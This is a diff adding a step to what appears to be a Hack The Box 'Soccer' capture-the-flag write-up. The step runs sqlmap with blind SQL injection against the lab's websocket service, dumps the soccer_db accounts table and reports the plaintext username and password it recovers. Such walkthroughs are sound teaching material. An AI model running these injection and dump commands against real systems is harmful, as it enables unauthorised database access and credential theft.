@@ -271,3 +271,21 @@ available databases [5]:
 [*] soccer_db
 [*] sys
 ```
+
+And then we choose a database and use the -D and --dump subcommands to choose the database and dump the database. 
+```
+sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10 -D soccer_db --dump
+
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
++------+-------------------+----------------------+----------+
+```
+and we got a username/password pair:
+
+player@player.htb and PlayerOftheMatch2022
+
